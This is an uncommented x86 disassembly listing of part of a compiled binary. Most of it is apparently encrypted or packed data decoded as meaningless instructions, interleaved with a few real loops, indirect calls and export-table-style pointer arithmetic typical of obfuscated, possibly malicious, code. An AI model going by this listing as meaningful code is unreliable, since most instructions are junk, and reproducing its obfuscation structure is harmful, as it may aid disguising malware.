  414038:	dec    esi
  414039:	(bad)  
  41403a:	icebp  
  41403b:	dec    ebp
  41403c:	sub    al,ah
  41403e:	div    BYTE PTR [edx]
  414040:	sbb    ecx,DWORD PTR [ebp-0x21]
  414043:	xchg   edx,eax
  414044:	lods   eax,DWORD PTR fs:[esi]
  414046:	jb     0x4140b9
  414048:	(bad)  
  414049:	adc    eax,0xa5411623
  41404e:	xchg   edx,eax
  41404f:	adc    eax,0x8398e8b
  414054:	mov    edx,0x18d06490
  414059:	ss clc 
  41405b:	mov    dh,0x42
  41405d:	jb     0x414054
  41405f:	adc    dl,dl
  414061:	add    ebp,DWORD PTR [edx-0x2f]
  414064:	mov    eax,ds:0xa1990966
  414069:	xchg   DWORD PTR [edx+ebp*2-0x10],ecx
  41406d:	mov    esi,0x76ef527
  414072:	shl    dl,1
  414074:	sbb    eax,DWORD PTR [eax+ecx*8+0x4]
  414078:	int    0x50
  41407a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41407b:	in     eax,dx
  41407c:	push   edi
  41407d:	jp     0x4140c4
  41407f:	or     BYTE PTR [ecx-0x15daa9e7],al
  414085:	(bad)  
  414086:	cmp    DWORD PTR [esi+0x5ec25873],ebx
  41408c:	xchg   ebp,eax
  41408d:	aas    
  41408e:	ins    DWORD PTR es:[edi],dx
  41408f:	cmp    BYTE PTR [esi],al
  414091:	dec    eax
  414092:	xchg   esp,eax
  414093:	test   BYTE PTR [ebp+eiz*2+0x3584f14c],bh
  41409a:	ja     0x4140fd
  41409c:	stos   DWORD PTR es:[edi],eax
  41409d:	fisttp DWORD PTR [edi-0x1f]
  4140a0:	jmp    0x4140ee
  4140a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4140a3:	das    
  4140a4:	sub    eax,0x89191868
  4140a9:	leave  
  4140aa:	test   eax,0xa0623dd1
  4140af:	mov    al,0x47
  4140b1:	mov    al,ds:0x9e94dc9d
  4140b6:	enter  0xd748,0x80
  4140ba:	addr16 test bl,0xd5
  4140be:	jmp    0x3ca9:0x5762085c
  4140c5:	push   edx
  4140c6:	sub    esp,ebx
  4140c8:	mov    BYTE PTR [esi-0x2d4bbd9],bl
  4140ce:	push   0xffffff9c
  4140d0:	push   esi
  4140d1:	mov    al,ds:0x34c498fb
  4140d6:	fwait
  4140d7:	sahf   
  4140d8:	xor    eax,0x5496a9da
  4140dd:	(bad)  
  4140de:	repnz cmp eax,DWORD PTR [esi]
  4140e1:	push   ecx
  4140e2:	ret    0x4b
  4140e5:	daa    
  4140e6:	outs   dx,DWORD PTR ds:[esi]
  4140e7:	dec    eax
  4140e8:	mov    ebp,0x4cfb517
  4140ed:	cwde   
  4140ee:	jbe    0x4140ab
  4140f0:	mov    ebp,0x6978865d
  4140f5:	adc    eax,DWORD PTR [edx+0x41]
  4140f8:	(bad)  
  4140f9:	fild   WORD PTR [esi]
  4140fb:	add    DWORD PTR [ebx+esi*4],edi
  4140fe:	or     DWORD PTR [edi-0x74],eax
  414101:	push   eax
  414102:	outs   dx,DWORD PTR ds:[esi]
  414103:	stc    
  414104:	inc    esi
  414105:	sub    DWORD PTR [ecx-0x474e4f14],eax
  41410b:	shl    DWORD PTR [eax+0xb],0x8e
  41410f:	xor    eax,0xe6274e84
  414114:	pcmpeqw mm3,mm7
  414117:	sub    al,0xd7
  414119:	dec    esi
  41411a:	and    si,WORD PTR [eax-0x3d]
  41411e:	stos   DWORD PTR es:[edi],eax
  41411f:	jno    0x414192
  414121:	rcr    BYTE PTR [ecx+0x62c9c012],cl
  414127:	enter  0x289f,0x20
  41412b:	push   0x67
  41412d:	add    ch,cl
  41412f:	ins    BYTE PTR es:[edi],dx
  414130:	hlt    
  414131:	fcomp  DWORD PTR [edx]
  414133:	inc    edi
  414134:	jmp    0x4140e2
  414136:	jne    0x41416a
  414138:	call   0xf629:0x4e6295a8
  41413f:	cmp    edx,DWORD PTR [ebx+0x50]
  414142:	ror    ebp,cl
  414144:	mov    bl,0xf9
  414146:	adc    BYTE PTR [eax-0x2693e9d6],dh
  41414c:	mov    dl,0x7a
  41414e:	pop    ds
  41414f:	mov    DWORD PTR [esi+0x3d],edi
  414152:	and    eax,0xeed9b1ae
  414157:	and    eax,0x316e0655
  41415c:	push   esi
  41415d:	sbb    eax,0x81ec458b
  414162:	and    eax,0x42fdd5
  414167:	add    BYTE PTR [eax],al
  414169:	add    BYTE PTR [eax],al
  41416b:	mov    ecx,DWORD PTR ds:0x42fdd5
  414171:	inc    ecx
  414172:	mov    DWORD PTR ds:0x42fdd5,ecx
  414178:	cmp    DWORD PTR ds:0x42fdd5,0x2c
  41417f:	jne    0x41418b
  414185:	call   DWORD PTR ds:0x42e66f
  41418b:	cmp    DWORD PTR ds:0x42fdd5,0x1e
  414192:	jb     0x41416b
  414198:	mov    ecx,DWORD PTR [ebp+0x8]
  41419b:	or     DWORD PTR ds:0x42fdd9,0x46b9
  4141a5:	add    ecx,DWORD PTR [eax+0x20]
  4141a8:	mov    DWORD PTR [ebp-0x28],ecx
  4141ab:	or     eax,DWORD PTR ds:0x42e7ff
  4141b1:	mov    eax,DWORD PTR [ebp-0x14]
  4141b4:	mov    ecx,DWORD PTR ds:0x42fde9
  4141ba:	sbb    DWORD PTR ds:0x42fdd5,ecx
  4141c0:	mov    ecx,DWORD PTR [ebp+0x8]
  4141c3:	add    DWORD PTR ds:0x42fe05,0x42e813
  4141cd:	add    ecx,DWORD PTR [eax+0x24]
  4141d0:	add    DWORD PTR ds:0x42e7eb,edi
  4141d6:	mov    DWORD PTR [ebp-0x2c],ecx
  4141d9:	mov    eax,DWORD PTR [ebp-0x14]
  4141dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4141df:	add    ecx,DWORD PTR [eax+0x1c]
  4141e2:	neg    eax
  4141e4:	xor    esi,esi
  4141e6:	and    DWORD PTR ds:0x42fe05,ebx
  4141ec:	mov    DWORD PTR [ebp-0x14],ecx
  4141ef:	or     DWORD PTR ds:0x42e80f,ecx
  4141f5:	mov    eax,DWORD PTR [ebp-0x28]
  4141f8:	and    DWORD PTR ds:0x42fddd,0x0
  414202:	mov    ecx,DWORD PTR ds:0x42fddd
  414208:	inc    ecx
  414209:	mov    DWORD PTR ds:0x42fddd,ecx
  41420f:	cmp    DWORD PTR ds:0x42fddd,0xc
  414216:	jne    0x41423b
  41421c:	push   DWORD PTR [ebp-0x18]
  41421f:	push   DWORD PTR [ebp-0x10]
  414222:	push   0x25b2
  414227:	push   DWORD PTR [ebp-0x10]
  41422a:	push   0x5d78
  41422f:	push   DWORD PTR [ebp-0x24]
  414232:	push   DWORD PTR [ebp-0x10]
  414235:	call   DWORD PTR ds:0x42e673
  41423b:	cmp    DWORD PTR ds:0x42fddd,0xb
  414242:	jne    0x414257
  414248:	xor    ecx,ecx
  41424a:	add    ecx,DWORD PTR ds:0x42fddd
  414250:	inc    ecx
  414251:	mov    DWORD PTR ds:0x42fddd,ecx
  414257:	cmp    DWORD PTR ds:0x42fddd,0x14
  41425e:	jb     0x414202
  414264:	mov    ecx,DWORD PTR [ebp+0x8]
  414267:	add    ecx,DWORD PTR [eax+edi*4]
  41426a:	lea    eax,[ebp-0x8]
  41426d:	mov    DWORD PTR [ebp-0x30],ecx
  414270:	push   eax
  414271:	jmp    0x414555
  414276:	add    ebx,0xffffff97
  414279:	xor    eax,0x71a17157
  41427e:	inc    edx
  41427f:	cld    
  414280:	xchg   ebx,eax
  414281:	loop   0x4142ad
  414283:	jno    0x4142a5
  414285:	xchg   esp,eax
  414286:	xor    BYTE PTR [ebx+0x70],0x70
  41428a:	mov    ecx,0xaf70707e
  41428f:	ret    
  414290:	mov    ah,0xdc
  414292:	adc    ebp,DWORD PTR [edi+edx*2]
  414295:	push   0x65
  414297:	mov    cl,0xe9
  414299:	mov    cl,0xd7
  41429b:	mov    al,0x74
  41429d:	add    BYTE PTR ds:0xfaf569c2,ch
  4142a3:	data16 ins BYTE PTR es:[edi],dx
  4142a5:	push   0x3450d7db
  4142aa:	mov    ds:0x823017b8,eax
  4142af:	xor    esp,0xffffff85
  4142b2:	(bad)  
  4142b3:	mov    ds:0x90b9c34,al
  4142b8:	jge    0x41424f
  4142ba:	rcpps  xmm6,xmm2
  4142bd:	cmp    dl,ah
  4142bf:	iret   
  4142c0:	mov    ds:0xecf77788,al
  4142c5:	push   esi
  4142c6:	into   
  4142c7:	fsub   st(0),st
  4142c9:	dec    esi
  4142ca:	bound  eax,QWORD PTR [edx-0x693ee7c9]
  4142d0:	mov    ds:0xcee3aef1,eax
  4142d5:	les    edi,FWORD PTR [edx]
  4142d7:	shr    BYTE PTR [eax+0x44],0xed
  4142db:	fild   QWORD PTR [ebp+0x5e]
  4142de:	inc    ebx
  4142df:	or     eax,0xf7119ecf
  4142e4:	push   edx
  4142e5:	aam    0x2b
  4142e7:	push   edi
  4142e8:	inc    esi
  4142e9:	rcl    BYTE PTR [ebp+0x1983b80],0x4b
  4142f0:	xchg   ebp,eax
  4142f1:	in     al,dx
  4142f2:	xchg   esi,eax
  4142f3:	lahf   
  4142f4:	sahf   
  4142f5:	leave  
  4142f6:	lea    edi,[ebp+0x50]
  4142f9:	push   esi
  4142fa:	into   
  4142fb:	cwde   
  4142fc:	xor    dh,dh
  4142fe:	mov    WORD PTR [eax+0x5b],ds
  414301:	jge    0x414379
  414303:	sub    dh,BYTE PTR fs:[eax+0x34]
  414307:	mov    ecx,DWORD PTR [ecx-0x2dc06bc9]
  41430d:	dec    ebp
  41430e:	outs   dx,BYTE PTR ds:[esi]
  41430f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414310:	rcl    BYTE PTR [edx+ebx*1+0x141125c1],cl
  414317:	xor    eax,DWORD PTR [ebp+0x70]
  41431a:	push   esp
  41431b:	addr16 repz popa 
  41431e:	fidivr DWORD PTR [edx+0x29]
  414321:	cld    
  414322:	dec    ebx
  414323:	stos   BYTE PTR es:[edi],al
  414324:	push   esp
  414325:	jecxz  0x414350
  414327:	mov    edx,0x75c4fbe0
  41432c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41432d:	xchg   DWORD PTR [ecx+0x5bcb29c2],ebx
  414333:	sub    eax,0xc7e01df3
  414338:	stos   DWORD PTR es:[edi],eax
  414339:	bnd jle 0x414366
  41433c:	lahf   
  41433d:	out    0xc0,eax
  41433f:	mov    edi,0x27cc1150
  414344:	fisttp WORD PTR [ebx-0x7c]
  414347:	adc    esi,ecx
  414349:	stc    
  41434a:	stos   BYTE PTR es:[edi],al
  41434b:	jge    0x414338
  41434d:	leave  
  41434e:	inc    ebx
  41434f:	jo     0x4143b9
  414351:	retf   0x2106
  414354:	mov    edi,DWORD PTR [ecx-0x67eedfb]
  41435a:	popf   
  41435b:	cwde   
  41435c:	cwde   
  41435d:	xchg   edi,eax
  41435e:	mov    ds:0x11dc015a,eax
  414363:	push   ebp
  414364:	dec    ebp
  414365:	jg     0x41437d
  414367:	mov    ch,0xd8
  414369:	fistp  DWORD PTR [edi+ebp*2]
  41436c:	xchg   BYTE PTR [esp+esi*8+0x4d],al
  414370:	js     0x41437b
  414372:	popa   
  414373:	push   cs
  414374:	ins    DWORD PTR es:[edi],dx
  414375:	mov    DWORD PTR [edx],0xc76e5296
  41437b:	pop    esp
  41437c:	jl     0x414391
  41437e:	hlt    
  41437f:	jmp    0x8870:0x30e4688f
  414386:	add    DWORD PTR ds:0x1c39abb2,edx
  41438c:	jp     0x41431a
  41438e:	cdq    
  41438f:	jbe    0x41432a
  414391:	cld    
  414392:	xlat   BYTE PTR ds:[ebx]
  414393:	dec    esi
  414394:	push   ebx
  414395:	dec    edx
  414396:	fiadd  DWORD PTR [edi]
  414398:	cmp    BYTE PTR [esp+eiz*8],ch
  41439b:	enter  0xc393,0xc5
  41439f:	ins    BYTE PTR es:[edi],dx
  4143a0:	mov    al,BYTE PTR [eax-0x77]
  4143a3:	cmp    al,0x8c
  4143a5:	inc    ebx
  4143a6:	js     0x4143d2
  4143a8:	mov    ah,0x5f
  4143aa:	pop    edi
  4143ab:	inc    ebp
  4143ac:	fucomi st,st(7)
  4143ae:	repz daa 
  4143b0:	cmc    
  4143b1:	test   DWORD PTR [esi-0x2d0326fb],esi
  4143b7:	pushf  
  4143b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4143b9:	mov    cs,WORD PTR [esi+0x455a9d58]
  4143bf:	shl    BYTE PTR [ecx+ecx*2],1
  4143c2:	inc    edi
  4143c3:	push   ebp
  4143c4:	and    cl,BYTE PTR [ebp+eax*8-0x3b41f1b5]
  4143cb:	inc    eax
  4143cc:	int3   
  4143cd:	inc    edi
  4143ce:	cwde   
  4143cf:	mov    esp,0xd4326710
  4143d4:	cmc    
  4143d5:	sbb    bl,BYTE PTR [ebx]
  4143d7:	ja     0x41439f
  4143d9:	rdmsr  
  4143db:	mov    ah,0x79
  4143dd:	pushfw 
  4143df:	stos   BYTE PTR es:[edi],al
  4143e0:	push   ds
  4143e1:	mov    al,0x9c
  4143e3:	pusha  
  4143e4:	mov    BYTE PTR [eax-0x27],dh
  4143e7:	mov    ah,BYTE PTR [ecx]
  4143e9:	mov    eax,edx
  4143eb:	push   esi
  4143ec:	inc    esi
  4143ed:	std    
  4143ee:	jp     0x414447
  4143f0:	push   cx
  4143f2:	jmp    0x1116:0x2eac559d
  4143f9:	xchg   cx,ax
  4143fb:	pop    ds
  4143fc:	or     eax,DWORD PTR [esi+eax*8+0x6c]
  414400:	hlt    
  414401:	dec    esi
  414402:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414403:	or     esi,esi
  414405:	and    BYTE PTR [edi-0xa],0xc
  414409:	cmp    edx,DWORD PTR [eax+0x19]
  41440c:	mov    ds:0x56d72ad6,eax
  414411:	push   edi
  414412:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414413:	adc    bh,BYTE PTR [ebx]
  414415:	dec    esi
  414416:	mov    edi,DWORD PTR [ebp+eax*8-0x6ea1575]
  41441d:	ficom  WORD PTR [esp+ebx*1-0x34a30ca6]
  414424:	mov    esp,0xfcb5ceaf
  414429:	call   0x568966b8
  41442e:	push   ebp
  41442f:	pop    ss
  414430:	rcr    DWORD PTR [edx-0x5abac3d2],cl
  414436:	clc    
  414437:	mov    ss,WORD PTR [ebx+0x4b1f1087]
  41443d:	mov    al,ss:0x14f2929a
  414443:	shl    BYTE PTR ds:0x5365e696,0x43
  41444a:	stc    
  41444b:	xor    eax,DWORD PTR [edx]
  41444d:	add    BYTE PTR [ebx+0x22],0xf2
  414451:	(bad)  
  414452:	outs   dx,DWORD PTR ds:[esi]
  414453:	and    BYTE PTR [eax-0x474586f8],dl
  414459:	nop
  41445a:	pusha  
  41445b:	(bad)  
  41445c:	mov    dl,0x33
  41445e:	pop    esp
  41445f:	mov    ebx,0x80958a3c
  414464:	sub    eax,0x45e79da0
  414469:	inc    ebp
  41446a:	xchg   BYTE PTR [eax+ecx*1],dl
  41446d:	jg     0x41449a
  41446f:	jns    0x414479
  414471:	or     dh,BYTE PTR [esi]
  414473:	xor    esp,DWORD PTR [ecx-0x33]
  414476:	xchg   BYTE PTR [edx],al
  414478:	pop    esp
  414479:	inc    ebx
  41447a:	mov    dl,0xab
  41447c:	test   al,0xde
  41447e:	xor    BYTE PTR [esi+0x30a8433b],ah
  414484:	jge    0x4144ae
  414486:	leave  
  414487:	mov    ds:0x2b6e498d,eax
  41448c:	mov    bh,0x45
  41448e:	neg    DWORD PTR [ecx+0x44]
  414491:	jl     0x414465
  414493:	or     ah,BYTE PTR [ebp-0x77e7734d]
  414499:	inc    edx
  41449a:	inc    edi
  41449b:	xchg   ax,ax
  41449d:	inc    ecx
  41449e:	xchg   ebx,eax
  41449f:	push   ecx
  4144a0:	inc    edi
  4144a1:	scas   eax,DWORD PTR es:[edi]
  4144a2:	xor    DWORD PTR [ebp-0x167a4ec8],ecx
  4144a8:	aam    0xa5
  4144aa:	cmp    BYTE PTR es:[ebp+ebp*4+0x20f14aaa],0xf7
  4144b3:	pop    esp
  4144b4:	sbb    al,0xcb
  4144b6:	sub    DWORD PTR [ecx+0x3e],edi
  4144b9:	mov    edi,0x42d5f83b
  4144be:	rcl    esp,1
  4144c0:	cdq    
  4144c1:	mov    ?,WORD PTR [ebx]
  4144c3:	mov    eax,ds:0xecc30088
  4144c8:	leave  
  4144c9:	lods   al,BYTE PTR ds:[esi]
  4144ca:	adc    edx,DWORD PTR [ecx-0x25cf5f53]
  4144d0:	cmp    DWORD PTR [edx+eax*2+0x6a],edi
  4144d4:	enter  0x1c82,0xbe
  4144d8:	fcomp  QWORD PTR [edx+0x24]
  4144db:	xchg   edi,eax
  4144dc:	ins    DWORD PTR es:[edi],dx
  4144dd:	stos   DWORD PTR es:[edi],eax
  4144de:	fisub  WORD PTR [ebx-0x78426e5e]
  4144e4:	jbe    0x4144ae
  4144e6:	pop    eax
  4144e7:	adc    BYTE PTR [esi-0x60153227],dl
  4144ed:	pop    es
  4144ee:	mov    ah,0x0
  4144f0:	outs   dx,DWORD PTR ds:[esi]
  4144f1:	xchg   ebp,eax
  4144f2:	test   al,bh
  4144f4:	icebp  
  4144f5:	and    al,0x25
  4144f7:	mov    dl,0x26
  4144f9:	xor    al,0xf4
  4144fb:	xlat   BYTE PTR ds:[ebx]
  4144fc:	mov    bh,0xd8
  4144fe:	cmp    edi,0xfffffffa
  414501:	jns    0x414579
  414503:	jp     0x4144b8
  414505:	dec    esi
  414506:	scas   eax,DWORD PTR es:[edi]
  414507:	mov    dl,0xd0
  414509:	xchg   DWORD PTR [ebp-0x8832a2d],eax
  41450f:	loope  0x4144c8
  414511:	sub    ebx,eax
  414513:	xor    eax,0xb3c0e2ed
  414518:	sbb    DWORD PTR [edi+0x41],ecx
  41451b:	xchg   edx,eax
  41451c:	aaa    
  41451d:	jno    0x41451a
  41451f:	push   esi
  414520:	scas   al,BYTE PTR es:[edi]
  414521:	xor    bh,cl
  414523:	popa   
  414524:	or     BYTE PTR [edx],dh
  414526:	stos   BYTE PTR es:[edi],al
  414527:	scas   eax,DWORD PTR es:[edi]
  414528:	mov    dl,0xec
  41452a:	pop    es
  41452b:	adc    bh,ah
  41452d:	adc    ebx,DWORD PTR [edi]
  41452f:	cdq    
  414530:	mov    bl,0x2c
  414532:	inc    esp
  414533:	mov    al,0x22
  414535:	rol    ebx,1
  414537:	xchg   ecx,eax
  414538:	adc    eax,DWORD PTR ds:0x65292432
  41453e:	outs   dx,DWORD PTR ds:[esi]
  41453f:	add    dh,BYTE PTR [edx]
  414541:	daa    
  414542:	nop
  414543:	mov    WORD PTR [ebp-0x4],?
  414546:	mov    al,ds:0xdf92f2
  41454b:	pop    ebp
  41454c:	cmp    cl,BYTE PTR [ebx-0x22c5da5a]
  414552:	jae    0x414578
  414554:	push   es
  414555:	push   DWORD PTR [ebp-0x30]
  414558:	push   DWORD PTR [ebp+0xc]
  41455b:	call   0x4036c0
  414560:	mov    eax,DWORD PTR [ebp-0x4]
  414563:	jmp    0x414847
  414568:	ret    
  414569:	sbb    al,0xfd
  41456b:	sub    BYTE PTR [ebp-0x4f],ah
  41456e:	jno    0x41455b
  414570:	pop    ebx
  414571:	or     eax,0x787beb4
  414576:	xchg   ebx,eax
  414577:	pusha  
  414578:	leave  
  414579:	jo     0x4145fa
  41457b:	jo     0x414536
  41457d:	jle    0x4145ef
  41457f:	jo     0x4145ec
  414581:	mov    eax,ds:0xce28b218
  414586:	hlt    
  414587:	push   0x1b0ce6d
  41458c:	(bad)  
  41458d:	(bad)  
  41458f:	(bad)  
  414590:	stos   DWORD PTR es:[edi],eax
  414591:	adc    DWORD PTR [edx+0x6c],0xa3026dc8
  414598:	dec    DWORD PTR [edi]
  41459a:	scas   al,BYTE PTR es:[edi]
  41459b:	lds    esi,FWORD PTR [esi+edx*8+0x20]
  41459f:	dec    ebp
  4145a0:	ins    BYTE PTR es:[edi],dx
  4145a1:	ja     0x4145c9
  4145a3:	stc    
  4145a4:	xchg   esi,eax
  4145a5:	pop    ss
  4145a6:	bound  edx,QWORD PTR [ebp+0x4545c188]
  4145ac:	sbb    edx,DWORD PTR [esp+ebx*1]
  4145af:	pop    esi
  4145b0:	out    dx,eax
  4145b1:	cs (bad) 
  4145b3:	fwait
  4145b4:	push   esp
  4145b5:	mov    esp,0x4fbcb5b7
  4145ba:	rol    ch,cl
  4145bc:	sti    
  4145bd:	cmp    ebx,ebp
  4145bf:	push   eax
  4145c0:	adc    BYTE PTR [ebx],dl
  4145c2:	inc    ebx
  4145c3:	je     0x41456c
  4145c5:	ret    
  4145c6:	jnp    0x41456f
  4145c8:	dec    ebp
  4145c9:	and    DWORD PTR [eax+0x29],edx
  4145cc:	test   BYTE PTR [ebp-0x5a],bl
  4145cf:	out    0xd3,eax
  4145d1:	vxorpd xmm0,xmm2,XMMWORD PTR [edx+0x370eeb49]
  4145d9:	(bad)  
  4145da:	int3   
  4145db:	or     eax,ebp
  4145dd:	outs   dx,BYTE PTR ds:[esi]
  4145de:	fidivr DWORD PTR [eax-0x7c608937]
  4145e4:	or     BYTE PTR [ebx-0x1c129708],al
  4145ea:	jo     0x414578
  4145ec:	fwait
  4145ed:	call   0x3a9949a3
  4145f2:	shr    BYTE PTR [edi-0x15],cl
  4145f5:	ds xchg ebp,eax
  4145f7:	lahf   
  4145f8:	mov    dh,0xbb
  4145fa:	add    BYTE PTR [ebx+ecx*8+0x5e],0x32
  4145ff:	or     BYTE PTR [esi+0x5a],cl
  414602:	jne    0x414621
  414604:	sub    BYTE PTR [edi],ch
  414606:	push   cs
  414607:	outs   dx,BYTE PTR ds:[esi]
  414608:	ss jbe 0x41461f
  41460b:	test   al,0xda
  41460d:	adc    al,0x21
  41460f:	mov    esi,0x42d332f3
  414614:	xor    BYTE PTR [esi+ecx*2-0x1f],dh
  414618:	inc    esi
  414619:	or     edx,DWORD PTR [edx+0x2bc0fa4]
  41461f:	xchg   ebx,eax
  414620:	js     0x4145db
  414622:	xlat   BYTE PTR ds:[ebx]
  414623:	mov    ebp,0xe24a1a2f
  414628:	cmp    ah,dl
  41462a:	adc    ebp,esi
  41462c:	xchg   edx,eax
  41462d:	ds pop eax
  41462f:	push   ebx
  414630:	cmc    
  414631:	int    0xd4
  414633:	sti    
  414634:	cmp    al,0x6f
  414636:	inc    edi
  414637:	(bad)  
  414638:	sbb    eax,0x88569ecc
  41463d:	sar    BYTE PTR [ebp+0x62],0x1d
  414641:	and    DWORD PTR [ebx-0x55d64666],esi
  414647:	ss ds cmp ah,ch
  41464b:	mov    ah,0x58
  41464d:	pop    esp
  41464e:	sbb    eax,esp
  414650:	out    0xa8,eax
  414652:	xor    ebp,DWORD PTR [edi-0x47]
  414655:	popf   
  414656:	out    0x2,eax
  414658:	mov    WORD PTR [ebx+0x41],gs
  41465b:	adc    al,0x7d
  41465d:	mov    dh,0x2b
  41465f:	das    
  414660:	dec    ecx
  414661:	sahf   
  414662:	bound  esi,QWORD PTR [ecx+0x1]
  414665:	sub    BYTE PTR [ebx+eiz*2],dl
  414668:	inc    ecx
  414669:	cwde   
  41466a:	push   es
  41466b:	ror    DWORD PTR [ebx+esi*1-0x33107dff],cl
  414672:	mov    BYTE PTR [ebp+0x1f],ch
  414675:	xchg   edi,eax
  414676:	jns    0x414615
  414678:	xchg   DWORD PTR [eax+0x439f89e8],edx
  41467e:	pop    esp
  41467f:	fcom   QWORD PTR [ebp-0x2df39268]
  414685:	lods   al,BYTE PTR ds:[esi]
  414686:	mov    ?,WORD PTR [ecx+0x20]
  414689:	xchg   ebx,eax
  41468a:	lods   eax,DWORD PTR ds:[esi]
  41468b:	cmp    ch,BYTE PTR [eax]
  41468d:	popf   
  41468e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41468f:	iret   
  414690:	inc    esp
  414691:	mov    cl,0xd9
  414693:	add    BYTE PTR [eax-0x41],dh
  414696:	or     al,0x9b
  414698:	imul   edi,esi,0xffffffd4
  41469b:	mov    bp,0xd517
  41469f:	push   ecx
  4146a0:	push   0x51452236
  4146a5:	push   edi
  4146a6:	mov    ecx,DWORD PTR [eax+0x3d]
  4146a9:	pop    esi
  4146aa:	lock mov ah,dh
  4146ad:	sbb    bl,dl
  4146af:	push   0x54
  4146b1:	pop    es
  4146b2:	adc    al,0x88
  4146b4:	stos   DWORD PTR es:[edi],eax
  4146b5:	pmullw mm3,QWORD PTR [eax]
  4146b8:	jmp    0x57f5:0x4a81c3a2
  4146bf:	pop    eax
  4146c0:	inc    ebp
  4146c1:	cmp    BYTE PTR [ebx+0x50],al
  4146c4:	cmc    
  4146c5:	and    edx,DWORD PTR [edx]
  4146c7:	and    BYTE PTR [eax-0x66],0x5c
  4146cb:	inc    edi
  4146cc:	mov    edx,ebx
  4146ce:	leave  
  4146cf:	or     al,0x9c
  4146d1:	dec    esi
  4146d2:	mov    dl,0x82
  4146d4:	mov    bh,0x15
  4146d6:	aam    0x97
  4146d8:	(bad)  
  4146d9:	jo     0x4146ed
  4146db:	adc    edx,0x4df52943
  4146e1:	push   ebp
  4146e2:	ins    DWORD PTR es:[edi],dx
  4146e3:	pop    eax
  4146e4:	fs push 0xfffffff3
  4146e7:	stos   DWORD PTR es:[edi],eax
  4146e8:	jle    0x4146b0
  4146ea:	(bad)  
  4146eb:	out    0xbe,al
  4146ed:	push   es
  4146ee:	dec    ebx
  4146ef:	push   ebx
  4146f0:	cmp    BYTE PTR [edx-0x401a7594],dh
  4146f6:	push   edi
  4146f7:	sub    al,0xa8
  4146f9:	fs repnz scas eax,DWORD PTR es:[edi]
  4146fc:	cmp    bh,BYTE PTR [ebp-0x1b]
  4146ff:	jo     0x414732
  414701:	rol    DWORD PTR [ecx-0x5c],0xb6
  414705:	fistp  QWORD PTR [edx]
  414707:	bound  eax,QWORD PTR [edi-0x133823a6]
  41470d:	imul   ebp,eax,0x4f
  414710:	aad    0xfb
  414712:	aad    0x8c
  414714:	sbb    edi,DWORD PTR [esp+esi*1-0x5d9fdbf7]
  41471b:	sub    al,BYTE PTR [ecx]
  41471d:	jae    0x4146f4
  41471f:	pop    eax
  414720:	mov    al,ds:0xe32b1b40
  414725:	outs   dx,DWORD PTR ds:[esi]
  414726:	cld    
  414727:	mov    bh,0x91
  414729:	test   eax,0xd1d02d8a
  41472e:	fiadd  DWORD PTR [di]
  414731:	mov    edi,0x4389c7a0
  414736:	pop    edi
  414737:	xchg   ebx,eax
  414738:	fild   QWORD PTR [ebx+0x39835839]
  41473e:	scas   eax,DWORD PTR es:[edi]
  41473f:	pushf  
  414740:	adc    ebx,edi
  414742:	mov    bh,BYTE PTR [edi]
  414744:	lods   eax,DWORD PTR ds:[esi]
  414745:	out    0x4d,al
  414747:	cmp    eax,DWORD PTR [ecx+0x34]
  41474a:	pop    esi
  41474b:	pop    ebp
  41474c:	call   0x996d:0x78173247
  414753:	ficomp WORD PTR [esi-0x68]
  414756:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414757:	xchg   edx,eax
  414758:	lahf   
  414759:	push   cs
  41475a:	jno    0x4147d1
  41475c:	inc    edx
  41475d:	loope  0x41479d
  41475f:	rcl    BYTE PTR [eax+eax*1-0x7a],1
  414763:	cmp    eax,0xca043fb1
  414768:	cdq    
  414769:	lds    esp,FWORD PTR [ebx+0x448c6bb2]
  41476f:	dec    esp
  414770:	xchg   ecx,eax
  414771:	mov    BYTE PTR [ecx+ebp*1],bl
  414774:	pop    ebx
  414775:	mov    ebx,0xdd77979e
  41477a:	ret    0xee62
  41477d:	test   DWORD PTR [ecx+0x9],0x5e2141ef
  414784:	jno    0x41474e
  414786:	retf   
  414787:	(bad)  [ebp-0x12f94b8f]
  41478d:	mov    edx,0x4eb10401
  414792:	dec    BYTE PTR [ebp+0x44]
  414795:	fadd   QWORD PTR cs:[ebx+0x5]
  414799:	(bad)  
  41479a:	pop    ecx
  41479b:	sbb    bl,BYTE PTR [ecx+eiz*4]
  41479e:	cmp    ah,BYTE PTR [edi]
  4147a0:	arpl   WORD PTR [edx+0x3091f52e],bp
  4147a6:	(bad)  
  4147a7:	adc    al,0x49
  4147a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4147aa:	add    BYTE PTR [ebx+0x39],dh
  4147ad:	cmp    DWORD PTR [ecx+0x49],esp
  4147b0:	jmp    0xb32c84a5
  4147b5:	add    al,0x15
  4147b7:	test   eax,0xb794f8ed
  4147bc:	scas   eax,DWORD PTR es:[edi]
  4147bd:	cmc    
  4147be:	icebp  
  4147bf:	aas    
  4147c0:	js     0x41480d
  4147c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4147c3:	push   eax
  4147c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4147c5:	adc    ch,0x3a
  4147c8:	pop    eax
  4147c9:	push   0x2179c6c0
  4147ce:	or     dh,cl
  4147d0:	or     eax,0x6b2aa2c2
  4147d5:	das    
  4147d6:	mov    ah,0x66
  4147d8:	cmp    esi,ebx
  4147da:	rcl    DWORD PTR cs:[edi-0x4a],0xf0
  4147df:	jle    0x414859
  4147e1:	in     al,0x9b
  4147e3:	mov    DWORD PTR [ecx-0x61],ebp
  4147e6:	mov    ah,0xb1
  4147e8:	inc    ebx
  4147e9:	jns    0x4147c6
  4147eb:	jp     0x4147ce
  4147ed:	dec    esi
  4147ee:	inc    edx
  4147ef:	(bad)  
  4147f0:	rcr    BYTE PTR [esi+0x5a],1
  4147f3:	push   0x9889fc16
  4147f8:	cmp    dh,0x62
  4147fb:	pop    ecx
  4147fc:	adc    bh,BYTE PTR [ecx+0x50]
  4147ff:	mov    ch,0xf3
  414801:	jne    0x414847
  414803:	ret    
